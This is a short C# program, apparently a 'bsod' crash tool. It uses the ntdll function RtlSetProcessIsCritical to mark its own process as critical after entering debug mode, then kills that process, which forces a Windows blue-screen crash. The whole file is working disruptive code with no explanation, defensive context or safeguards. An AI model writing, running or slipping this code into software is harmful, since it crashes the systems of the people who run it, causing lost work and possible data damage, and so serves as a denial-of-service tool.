using System;
using System.Runtime.InteropServices;

namespace bsod
{
    internal class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        static void Main(string[] args)
        {
            
            System.Diagnostics.Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
    }
}
